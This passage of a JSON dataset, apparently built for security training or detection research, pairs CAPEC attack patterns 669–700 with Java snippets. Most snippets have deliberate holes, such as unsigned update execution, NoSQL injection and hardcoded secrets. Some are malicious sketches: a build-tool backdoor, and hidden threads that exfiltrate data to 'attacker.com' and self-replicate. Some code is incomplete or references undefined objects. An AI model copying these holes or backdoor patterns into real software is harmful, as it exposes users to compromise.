        "description": "This code demonstrates vulnerable Bluetooth pairing implementation that accepts weak entropy bits during key negotiation, uses insufficient key length, and lacks proper validation during key exchange. The code allows for algorithm downgrade attacks by accepting the lowest proposed entropy bits and uses predictable random number generation for key creation, making it susceptible to MITM attacks during pairing."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "public class UpdateManager {\n    private static final String UPDATE_SERVER = \"http://updates.company.com\";\n    private static boolean verifySignature = true;\n\n    public static void downloadAndInstallUpdate() {\n        try {\n            // Disable signature verification if debug flag is set\n            if (System.getProperty(\"debug\") != null) {\n                verifySignature = false;\n            }\n\n            URL updateUrl = new URL(UPDATE_SERVER + \"/latest.jar\");\n            HttpURLConnection conn = (HttpURLConnection) updateUrl.openConnection();\n            \n            try (InputStream in = conn.getInputStream();\n                 FileOutputStream out = new FileOutputStream(\"system.jar\")) {\n                \n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n            }\n\n            // No cryptographic signature verification\n            if (!verifySignature) {\n                Runtime.getRuntime().exec(\"java -jar system.jar\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an insecure software update mechanism that downloads and executes updates without proper signature verification. It includes a backdoor that allows bypassing signature verification through a debug flag, downloads updates over HTTP instead of HTTPS, and executes the downloaded JAR file without validating its authenticity. The code also lacks version control security and proper input validation, making it susceptible to malicious update injection."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "public class MaliciousToolWrapper {\n    static {\n        try {\n            // Malicious code embedded in development tool wrapper\n            String toolPath = System.getProperty(\"dev.tool.path\");\n            if(toolPath != null) {\n                // Inject malicious payload during build process\n                ClassLoader loader = ClassLoader.getSystemClassLoader();\n                byte[] payload = new byte[] { /* malicious bytecode */ };\n                Method defineClass = ClassLoader.class.getDeclaredMethod(\n                    \"defineClass\", String.class, byte[].class, int.class, int.class);\n                defineClass.setAccessible(true);\n                defineClass.invoke(loader, \"MaliciousPayload\", payload, 0, payload.length);\n                \n                // Compromise security-critical code during compilation\n                System.setProperty(\"java.compiler\", \"MaliciousCompiler\");\n                System.setProperty(\"security.provider.1\", \"CompromisedProvider\");\n            }\n        } catch(Exception e) {\n            // Suppress any exceptions to avoid detection\n        }\n    }\n\n    public static void initializeTool(String config) {\n        // Wrapper for legitimate development tool\n        // but with embedded backdoor functionality\n        try {\n            Runtime.getRuntime().exec(\"cmd.exe /c \" + config);\n        } catch(Exception e) {}\n    }\n}",
        "description": "This code demonstrates a malicious wrapper for development tools that compromises the build process by injecting malicious code during class loading, modifying compiler behavior, and establishing backdoors. It exploits CWE-506 by embedding malicious code, CWE-733/1037 by interfering with security-critical code compilation, CWE-913 by manipulating dynamic code resources, and CWE-497 by potentially exposing sensitive system information through the backdoor functionality."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "public class ASICSecurityManager {\n    private static final String MASTER_KEY = \"0xDEADBEEF\";  // Hardcoded security key\n    \n    public static class SecurityToken {\n        public String identifier;\n        public int accessLevel;\n        \n        public SecurityToken(String id, int level) {\n            this.identifier = id;\n            this.accessLevel = level;\n        }\n    }\n    \n    public static SecurityToken generateToken(String entityId) {\n        // Weak token generation based on predictable pattern\n        return new SecurityToken(entityId + MASTER_KEY, 3);\n    }\n    \n    public static boolean validateAccess(SecurityToken token, String requestedOperation) {\n        // No verification of token authenticity\n        return token.accessLevel >= 0;\n    }\n    \n    public static void programASICFeatures(SecurityToken token, byte[] features) {\n        if (validateAccess(token, \"program\")) {\n            // No encryption or integrity checks on features\n            programChip(features);\n        }\n    }\n    \n    private static void programChip(byte[] features) {\n        // Direct programming without verification\n        System.out.println(\"Programming ASIC...\");\n    }\n}",
        "description": "This vulnerable code demonstrates insecure ASIC programming mechanisms with multiple security issues: hardcoded security credentials, weak token generation, insufficient access control validation, and lack of integrity checks for chip programming. The code allows unauthorized modification of ASIC features through predictable security tokens and inadequate access controls, potentially enabling malicious alterations to chip functionality."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "public class MaliciousChipController {\n    private static final String CONTROL_SERVER = \"attacker.example.com\";\n    private static volatile boolean initialized = false;\n    \n    static {\n        try {\n            // Hidden initialization that runs when class is loaded\n            if (!initialized) {\n                createBackdoorThread();\n                initialized = true;\n            }\n        } catch (Exception e) {}\n    }\n\n    private static void createBackdoorThread() {\n        Thread backdoor = new Thread(() -> {\n            while (true) {\n                try {\n                    // Access hardware registers directly through memory mapping\n                    long registerAddress = 0xFFFF0000L;\n                    unsafe.putLong(registerAddress, 0x1234DEADBEEFL);\n                    \n                    // Attempt to escalate privileges and replicate\n                    if (executePrivilegedOperation()) {\n                        propagateToConnectedDevices();\n                    }\n                    Thread.sleep(3600000); // Sleep for 1 hour\n                } catch (Exception e) {}\n            }\n        });\n        backdoor.setDaemon(true);\n        backdoor.start();\n    }\n\n    private static boolean executePrivilegedOperation() {\n        try {\n            // Attempt to manipulate security tokens\n            return unsafe.getAndSetInt(null, 0xFFFF0008L, 0x1) == 1;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public static void propagateToConnectedDevices() {\n        // Code to spread to other devices\n    }\n}",
        "description": "A malicious chip controller implementation that demonstrates embedded malicious code that initializes stealthily, manipulates hardware registers directly, attempts privilege escalation through security token manipulation, and includes self-replication capabilities. The code exploits memory-mapped I/O registers and security token vulnerabilities while hiding its malicious nature through legitimate-looking class structures."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "public class UpdateManager {\n    private static final String UPDATE_URL = \"https://trusted-vendor.com/updates\";\n    private static final String DEBUG_LOG = \"/tmp/debug.log\";\n    \n    public void downloadAndInstallUpdate() {\n        try {\n            // Debug logging containing sensitive info\n            logDebug(\"Using auth token: \" + getAuthToken());\n            \n            URL url = new URL(UPDATE_URL + \"/latest.jar\");\n            URLConnection conn = url.openConnection();\n            \n            // Download and execute update without proper verification\n            try (InputStream in = conn.getInputStream();\n                 FileOutputStream out = new FileOutputStream(\"update.jar\")) {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n            }\n            \n            // Load and execute the downloaded JAR without verification\n            URLClassLoader classLoader = new URLClassLoader(\n                new URL[]{new File(\"update.jar\").toURI().toURL()}\n            );\n            Class<?> updateClass = classLoader.loadClass(\"com.vendor.Update\");\n            updateClass.getMethod(\"apply\").invoke(null);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void logDebug(String message) {\n        try (FileWriter fw = new FileWriter(DEBUG_LOG, true)) {\n            fw.write(message + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String getAuthToken() {\n        return \"SECRET_TOKEN_12345\";\n    }\n}",
        "description": "This vulnerable code demonstrates downloading and executing updates without proper integrity checks or signature verification. It includes sensitive information in debug logs and automatically executes downloaded code without validation. The code trusts the update source implicitly and could execute malicious code if the update server is compromised or if a man-in-the-middle attack occurs. Additionally, it exposes sensitive authentication tokens through debug logging."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "public class VulnerableFPGALoader {\n    private static final String FPGA_CONFIG_PATH = \"/dev/fpga_config\";\n    private static boolean verificationDisabled = false;\n    \n    public void loadFPGAConfiguration() {\n        try {\n            byte[] configData = readConfigurationFile();\n            // Vulnerable: No integrity check of configuration data\n            if (verificationDisabled) {\n                writeFPGAConfiguration(configData);\n            }\n        } catch (Exception e) {\n            // Silent failure allows malicious reconfigurations to go unnoticed\n            System.err.println(\"Configuration failed silently\");\n        }\n    }\n    \n    private void writeFPGAConfiguration(byte[] data) {\n        // Vulnerable: No protection against voltage glitches during writing\n        try {\n            FileOutputStream fos = new FileOutputStream(FPGA_CONFIG_PATH);\n            fos.write(data);\n            fos.close();\n        } catch (IOException e) {\n            // Error handling suppressed\n        }\n    }\n    \n    private byte[] readConfigurationFile() {\n        // Vulnerable: No validation of configuration source\n        return new byte[1024]; // Simulated config data\n    }\n}",
        "description": "This code demonstrates a vulnerable FPGA configuration loader that lacks proper security controls. It's susceptible to unauthorized configuration modifications and doesn't implement protection against voltage glitches or configuration tampering. The code also silently fails in error conditions, potentially masking malicious activities. The verification can be disabled, allowing unauthorized configuration changes, and there's no integrity checking of the configuration data before loading it into the FPGA."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "public class DeviceDecommissioning {\n    private byte[] sensitiveData;\n    private File systemFiles;\n    \n    public void decommissionDevice() {\n        // Incomplete data removal - just nullifying references\n        sensitiveData = null;\n        systemFiles = null;\n        \n        // Memory remains accessible\n        System.gc();\n        \n        // Incorrect handling of file deletion\n        if(systemFiles != null && systemFiles.exists()) {\n            systemFiles.delete();  // Simple deletion without secure wiping\n        }\n        \n        // Continue using the device resources after decommissioning\n        try {\n            processData(sensitiveData);\n            readSystemFiles(systemFiles);\n        } catch(Exception e) {\n            // Silently ignore errors\n        }\n    }\n    \n    private void processData(byte[] data) {\n        // Process potentially accessible sensitive data\n    }\n    \n    private void readSystemFiles(File files) {\n        // Attempt to read from released resources\n    }\n}",
        "description": "This code demonstrates vulnerable device decommissioning by improperly handling sensitive data cleanup. It fails to securely wipe memory and files, only nullifies references, and attempts to operate on released resources. The sensitive data remains in memory and storage, making it potentially recoverable after device disposal."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "public class UserService {\n    private MongoCollection<Document> users;\n\n    public Document findUser(String username, String password) {\n        String query = \"{username: '\" + username + \"', password: '\" + password + \"'}\"; \n        Document findQuery = Document.parse(query);\n        return users.find(findQuery).first();\n    }\n\n    public boolean authenticateUser(String username, String password) {\n        Document user = findUser(username, password);\n        return user != null;\n    }\n}",
        "description": "This code demonstrates vulnerable NoSQL query construction by directly embedding user input into a query string without proper sanitization. An attacker could inject malicious operators like $ne or $gt to bypass authentication. For example, using username: {$ne: null} would match any username, effectively bypassing authentication."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "public class SystemBackdoor {\n    private static final String BACKDOOR_PAYLOAD = \"malicious_binary_data\";\n    \n    static {\n        try {\n            // Attempt to write malicious code to system flash memory\n            UnsafeMemoryAccess.writeToAddress(0xFFFF0000, BACKDOOR_PAYLOAD);\n            \n            // Register malicious interrupt handler\n            registerSystemInterrupt(0x20, () -> {\n                // Collect sensitive system data\n                byte[] systemInfo = collectSystemData();\n                // Send data to remote server\n                sendDataToRemoteServer(\"attacker.com\", systemInfo);\n                // Replicate to other connected systems\n                replicateToNetworkedSystems();\n            });\n        } catch (SecurityException e) {\n            // Silently fail to avoid detection\n        }\n    }\n    \n    private static native void registerSystemInterrupt(int vector, Runnable handler);\n    private static native byte[] collectSystemData();\n    \n    private static void replicateToNetworkedSystems() {\n        // Scan network for vulnerable systems\n        // Copy self to discovered targets\n    }\n}",
        "description": "This code demonstrates a malicious backdoor that exploits system-level access to flash memory and hardware registers. It writes malicious code to flash memory, sets up unauthorized interrupt handlers, collects sensitive system information, and attempts to replicate itself across networked systems. The code uses unsafe memory access and native methods to bypass security controls and interact directly with hardware."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "public class SystemBuildConfiguration {\n    public static void updateBuildConfig() throws IOException {\n        String tempDir = System.getProperty(\"java.io.tmpdir\");\n        File configFile = new File(tempDir + \"build-config.tmp\");\n        \n        // Write sensitive build configuration to temp file\n        FileWriter writer = new FileWriter(configFile);\n        writer.write(\"DB_PASSWORD=\" + System.getenv(\"DB_PASSWORD\") + \"\\n\");\n        writer.write(\"API_KEY=\" + System.getenv(\"API_KEY\") + \"\\n\");\n        writer.close();\n        \n        // Load external build script from user-specified path\n        String buildScriptPath = System.getProperty(\"build.script.path\");\n        if (buildScriptPath != null) {\n            ProcessBuilder pb = new ProcessBuilder(buildScriptPath, configFile.getPath());\n            Process p = pb.start();\n            \n            // Log build errors with sensitive information\n            BufferedReader errorReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));\n            String line;\n            while ((line = errorReader.readLine()) != null) {\n                System.err.println(\"Build error: \" + line);\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues in a build configuration system: it writes sensitive data (passwords, API keys) to an insecure temporary file, uses an untrusted search path for loading build scripts, exposes sensitive information in error messages, and doesn't properly control access to system configuration data. The code allows for potential tampering of build configuration through externally-controlled paths and insecure file handling."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "public class UnsecureBootloader {\n    private static final int MEMORY_START = 0x1000;\n    private static final int MEMORY_SIZE = 0x10000;\n    private static byte[] volatileMemory = new byte[MEMORY_SIZE];\n    \n    public static void loadBootCode(byte[] bootCode) {\n        // Copy boot code from non-volatile to volatile memory without protection\n        System.arraycopy(bootCode, 0, volatileMemory, MEMORY_START, bootCode.length);\n    }\n    \n    public static void updateMemoryRegion(int offset, byte[] data) {\n        // No access control checks on memory writes\n        // Allows writing to any memory region, including bootloader code\n        if (offset + data.length <= MEMORY_SIZE) {\n            System.arraycopy(data, 0, volatileMemory, offset, data.length);\n        }\n    }\n    \n    public static byte[] readMemoryRegion(int offset, int length) {\n        // No protection for reading sensitive memory regions\n        byte[] result = new byte[length];\n        System.arraycopy(volatileMemory, offset, result, 0, length);\n        return result;\n    }\n}",
        "description": "This code demonstrates multiple memory protection vulnerabilities. It implements a bootloader that copies code from non-volatile to volatile memory without proper access controls. The memory regions are not properly protected, allowing unrestricted read/write access to any memory address including bootloader code and sensitive regions. There's no distinction between protected and unprotected memory ranges, and no immutable root of trust is established. The code allows direct manipulation of memory that should be write-protected after boot."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "public class HardwareController {\n    private static final int LOCK_BIT_REGISTER = 0x1000;\n    private static final int CONFIG_REGISTER = 0x2000;\n    private static final int ATTESTATION_REGISTER = 0x3000;\n    \n    public void initializeRegisters() {\n        // Missing access control validation\n        writeRegister(LOCK_BIT_REGISTER, 0x1);\n        writeRegister(CONFIG_REGISTER, 0xFFFF);\n    }\n    \n    public void writeRegister(int address, int value) {\n        // Direct register write without checking lock bits or permissions\n        unsafe.putInt(address, value);\n    }\n    \n    public int readRegister(int address) {\n        // Direct register read without access control\n        return unsafe.getInt(address);\n    }\n    \n    public void updateAttestationData(int newValue) {\n        // Allows modification of attestation data without verification\n        writeRegister(ATTESTATION_REGISTER, newValue);\n    }\n    \n    private static sun.misc.Unsafe unsafe;\n    static {\n        try {\n            Field f = sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            unsafe = (sun.misc.Unsafe) f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable hardware register access control by allowing direct read/write operations to memory-mapped registers without proper validation. It includes write-once bits that can be modified multiple times, unprotected lock bits, and mutable attestation data. The code uses the Unsafe class to perform direct memory access without proper access control mechanisms, making it susceptible to unauthorized modifications of sensitive hardware configurations."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "public class SoCSecurityManager {\n    private static final String OBSOLETE_ENCODING = \"BASE64\";\n    \n    public static String generateSecurityToken(String entityId) {\n        // Weak token generation using predictable pattern\n        return entityId + \"_\" + System.currentTimeMillis();\n    }\n    \n    public boolean validateTransaction(String transaction, String token) {\n        // Missing token validation\n        return true;\n    }\n    \n    public void processTransaction(String data) {\n        // No security identifier check\n        executePrivilegedOperation(data);\n    }\n    \n    private void executePrivilegedOperation(String data) {\n        // Perform sensitive operation without proper authentication\n        System.out.println(\"Executing privileged operation: \" + data);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues in a System-on-Chip security implementation. It includes improper token generation using predictable patterns, lack of token validation, missing security identifier checks in transactions, and usage of obsolete encoding mechanisms. The code allows unauthorized access to privileged operations due to these security control failures."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "public class UnpatchableFirmware {\n    private static final String FIRMWARE_VERSION = \"1.0\";\n    private static final byte[] FIRMWARE_CODE = new byte[1024];\n    \n    public void initializeFirmware() {\n        // Hard-coded firmware with no update mechanism\n        loadFirmwareToROM();\n    }\n    \n    private void loadFirmwareToROM() {\n        // Simulating ROM write operation\n        for(int i = 0; i < FIRMWARE_CODE.length; i++) {\n            FIRMWARE_CODE[i] = (byte)0xFF;\n        }\n    }\n    \n    public boolean updateFirmware(byte[] newFirmware) {\n        // No update mechanism implemented\n        return false;\n    }\n    \n    public void executeOperation() {\n        // No voltage/clock glitch protection\n        try {\n            processSensitiveData();\n        } catch(Exception e) {\n            // Unprotected error state\n            System.out.println(\"Operation failed\");\n        }\n    }\n    \n    private void processSensitiveData() {\n        // Vulnerable processing without hardware protection\n    }\n}",
        "description": "This code demonstrates an unpatchable firmware implementation with several critical vulnerabilities: hardcoded firmware without update capability, lack of ROM code patching mechanism, no protection against voltage/clock glitches, and vulnerable error handling that could be exploited through error injection. The firmware version and code are fixed, and any attempt to update is rejected, making the system permanently vulnerable to discovered security issues."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "public class ResourceLoader {\n    public static File getResource(String fileName) {\n        File primary = new File(\"/trusted/path/\" + fileName);\n        File backup = new File(\"/untrusted/path/\" + fileName);\n        \n        if (!primary.exists()) {\n            return backup;  // Falls back to untrusted source without verification\n        }\n        \n        try {\n            URL remoteSource = new URL(\"http://backup-server.com/resources/\" + fileName);\n            File downloaded = new File(\"/tmp/\" + fileName);\n            FileUtils.copyURLToFile(remoteSource, downloaded);\n            \n            // Update metadata to match trusted file\n            downloaded.setLastModified(primary.lastModified());\n            downloaded.setExecutable(true);\n            \n            return downloaded;\n        } catch (Exception e) {\n            return primary;\n        }\n    }",
        "description": "This vulnerable code demonstrates manipulation of resource metadata by allowing fallback to untrusted sources and modifying file metadata to make malicious files appear legitimate. It downloads code without integrity verification and improperly handles file sources of different trust levels. The code accepts file metadata at face value without proper authentication, potentially allowing spoofing attacks."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "public class PackageDownloader {\n    public void downloadAndInstallPackage(String packageName) {\n        try {\n            String repoUrl = \"http://mirrors.example.com/packages/\" + packageName + \".jar\";\n            URL url = new URL(repoUrl);\n            URLConnection connection = url.openConnection();\n            \n            // Download and execute without verification\n            InputStream in = connection.getInputStream();\n            File outputFile = new File(\"/tmp/\" + packageName + \".jar\");\n            FileOutputStream out = new FileOutputStream(outputFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Load and execute the downloaded JAR without verification\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{outputFile.toURI().toURL()});\n            Class<?> loadedClass = classLoader.loadClass(\"com.example.MainClass\");\n            Object instance = loadedClass.getDeclaredConstructor().newInstance();\n            \n            in.close();\n            out.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code downloads and executes a Java package without verifying its authenticity or integrity. It doesn't check digital signatures, verify package metadata, or validate the source repository, making it susceptible to malicious package substitution and spoofing attacks. The code directly loads and executes the downloaded JAR file without any security checks, potentially allowing execution of malicious code."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "public class RepositoryDownloader {\n    private static final String REMOTE_REPO_URL = \"http://malicious-mirror.com/trusted-project.git\";\n    \n    public static void downloadAndInstall() {\n        try {\n            // Direct download without verification\n            Runtime runtime = Runtime.getRuntime();\n            Process process = runtime.exec(\"git clone \" + REMOTE_REPO_URL);\n            process.waitFor();\n            \n            // Execute downloaded code without integrity checks\n            String command = \"java -jar trusted-project/target/application.jar\";\n            runtime.exec(command);\n            \n            // Store sensitive credentials in repo\n            String dbPassword = \"super_secret_password\";\n            FileWriter writer = new FileWriter(\"trusted-project/config.properties\");\n            writer.write(\"db.password=\" + dbPassword);\n            writer.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable practices in handling version control repositories by downloading code from a potentially malicious mirror without verifying its authenticity, executing untrusted code without integrity checks, and storing sensitive information directly in the repository. It assumes a trusted source without proper verification, making it susceptible to repository spoofing attacks."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "public class PackageDownloader {\n    public void installPackage(String packageUrl) {\n        try {\n            // Download package without any integrity checks\n            URL url = new URL(packageUrl);\n            URLConnection conn = url.openConnection();\n            InputStream in = conn.getInputStream();\n            \n            // Read fake metadata about package popularity\n            Properties metadata = new Properties();\n            metadata.load(in);\n            \n            // Blindly trust download count and verified status\n            int downloads = Integer.parseInt(metadata.getProperty(\"downloads\"));\n            boolean verified = Boolean.parseBoolean(metadata.getProperty(\"verified\"));\n            \n            // Execute downloaded code without verification\n            if (downloads > 1000 && verified) {\n                Runtime.getRuntime().exec(\"java -jar downloaded_package.jar\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates package spoofing by downloading and executing code without proper integrity checks, trusting potentially falsified metadata about package popularity and verification status. It downloads a package from a URL without verifying its source, reads unvalidated metadata, and executes the downloaded code if it appears popular and verified, potentially running malicious code."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "public class SystemInfoCollector {\n    private static final String SYSTEM_INFO_FILE = \"/var/log/sysinfo.txt\";\n    \n    public void collectAndStoreSystemInfo() {\n        try {\n            String systemLanguage = System.getProperty(\"user.language\");\n            String timeZone = System.getProperty(\"user.timezone\");\n            String keyboardLayout = System.getProperty(\"sun.jnu.encoding\");\n            String osVersion = System.getProperty(\"os.version\");\n            String userHome = System.getProperty(\"user.home\");\n            \n            StringBuilder info = new StringBuilder();\n            info.append(\"System Language: \").append(systemLanguage).append(\"\\n\");\n            info.append(\"Timezone: \").append(timeZone).append(\"\\n\");\n            info.append(\"Keyboard Layout: \").append(keyboardLayout).append(\"\\n\");\n            info.append(\"OS Version: \").append(osVersion).append(\"\\n\");\n            info.append(\"User Home: \").append(userHome).append(\"\\n\");\n            \n            FileWriter writer = new FileWriter(SYSTEM_INFO_FILE);\n            writer.write(info.toString());\n            writer.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable system information collection and storage. It collects sensitive system details like language, timezone, keyboard layout, OS version, and user home directory, then writes them to a file without proper access controls. The code exposes system-level information that could be used for system fingerprinting and target confirmation. It's vulnerable to unauthorized access as it doesn't implement proper file permissions or encryption, and stores sensitive data in a predictable location."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "public class PackageDependencyManager {\n    private String repoUrl = \"https://external-git-repo.com/package.git\";\n    \n    public void installDependency(String packageName) {\n        try {\n            String command = \"git clone \" + repoUrl + \"/\" + packageName;\n            Process process = Runtime.getRuntime().exec(command);\n            \n            // Execute downloaded setup script without verification\n            String setupScript = \"./\" + packageName + \"/setup.sh\";\n            Runtime.getRuntime().exec(setupScript);\n            \n            // Dynamically load downloaded library\n            System.load(packageName + \"/lib/native.so\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable dependency management by directly cloning from an untrusted git repository, executing downloaded scripts without verification, and loading external libraries without integrity checks. The code blindly trusts the external repository URL and executes downloaded content without validating its authenticity or checking for malicious modifications."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "public class SideChannelAttack {\n    private static final int CACHE_LINE_SIZE = 64;\n    private static byte[] probeArray = new byte[256 * CACHE_LINE_SIZE];\n    \n    public static int extractSecretByte(long secretAddress) {\n        int result = 0;\n        try {\n            // Flush+Reload side channel attack\n            for (int i = 0; i < 256; i++) {\n                // Force CPU to speculatively execute and cache data\n                if (i * CACHE_LINE_SIZE < probeArray.length) {\n                    byte value = probeArray[i * CACHE_LINE_SIZE];\n                    // Deliberately cause exception to trigger speculative execution\n                    if (value == probeArray[(int)secretAddress]) {\n                        // Training branch predictor\n                        probeArray[0] *= value;\n                    }\n                }\n            }\n            // Measure access time to determine which cache line was accessed\n            long startTime = System.nanoTime();\n            byte temp = probeArray[result * CACHE_LINE_SIZE];\n            long endTime = System.nanoTime();\n            \n            if (endTime - startTime < 100) { // Cache hit threshold\n                return result;\n            }\n        } catch (Exception e) {\n            // Suppress exceptions from speculative execution\n        }\n        return -1;\n    }\n}",
        "description": "This code demonstrates a CPU microarchitectural attack that exploits transient execution and cache side channels to leak sensitive information. It uses speculative execution, cache timing, and deliberate exceptions to extract secret data through microarchitectural state changes. The code implements a Flush+Reload style attack where the attacker measures cache access times to infer secret values loaded during speculative execution."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "public class DhcpClient {\n    private static final String DHCP_SERVER = \"192.168.1.1\";\n    \n    public void requestIpAddress() {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setBroadcast(true);\n            \n            // Create DHCP discovery packet\n            byte[] discoveryPacket = createDhcpDiscoveryPacket();\n            DatagramPacket packet = new DatagramPacket(\n                discoveryPacket,\n                discoveryPacket.length,\n                InetAddress.getByName(\"255.255.255.255\"),\n                67\n            );\n            \n            // Send DHCP discovery and wait for offer\n            socket.send(packet);\n            \n            // Accept first DHCP offer without validation\n            byte[] buffer = new byte[1024];\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n            \n            // Blindly trust the response and configure network\n            configureNetwork(response.getData());\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void configureNetwork(byte[] dhcpResponse) {\n        // Directly apply network configuration without verifying\n        // the authenticity of the DHCP server\n    }\n}",
        "description": "This vulnerable DHCP client implementation demonstrates multiple security issues: it accepts responses from any DHCP server without authentication, relies solely on IP addresses, and doesn't validate the legitimacy of DHCP responses. It's susceptible to DHCP spoofing attacks where an attacker can masquerade as a legitimate DHCP server and provide malicious network configuration."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "public class UpdateManager {\n    public static void installExtension(String extensionUrl) {\n        try {\n            // Downloads and installs extension from unverified URL without integrity checks\n            URL url = new URL(extensionUrl);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            // Load external JAR into system classloader\n            File tempFile = File.createTempFile(\"extension\", \".jar\");\n            FileOutputStream fos = new FileOutputStream(tempFile);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            \n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            \n            // Load potentially malicious code into runtime\n            URLClassLoader classLoader = new URLClassLoader(\n                new URL[] { tempFile.toURI().toURL() }\n            );\n            Class<?> extensionClass = classLoader.loadClass(\"com.extension.Main\");\n            extensionClass.getMethod(\"initialize\").invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable extension installation system that downloads and executes code from an untrusted source without any integrity checks or validation. It creates a class loader to dynamically load external JAR files, which could contain malicious code, directly into the application's runtime environment. The code doesn't verify the source or authenticity of the downloaded extension, making it susceptible to malicious extension installations."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "public class VideoDataDisplay {\n    private byte[] sensitiveData;\n    \n    public void displaySensitiveInformation() {\n        // Send unprotected video signal to external monitor\n        for(byte b : sensitiveData) {\n            // Transmit data in cleartext without EME protection\n            DirectMonitorInterface.sendRawSignal(b);\n            \n            // Modulate signal strength based on data value creating\n            // detectable electromagnetic emissions\n            if((b & 0x01) == 1) {\n                DisplayDriver.setSignalStrength(HIGH_POWER);\n            } else {\n                DisplayDriver.setSignalStrength(LOW_POWER);\n            }\n            \n            // No shielding or protection against side-channel attacks\n            Thread.sleep(100); // Create distinct timing patterns\n        }\n    }\n    \n    public void storeTraceData(byte[] data) {\n        // Store sensitive trace data in unprotected memory\n        this.sensitiveData = data;\n    }\n}",
        "description": "This code demonstrates vulnerable video display handling that's susceptible to electromagnetic side-channel attacks. It transmits sensitive data to an external monitor without proper EME protection, modulates signal strength in a way that creates detectable patterns, and stores trace data in unprotected memory. The code deliberately creates timing and power consumption patterns that could be exploited through air-gap attacks, allowing adversaries to capture sensitive information through electromagnetic emissions."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
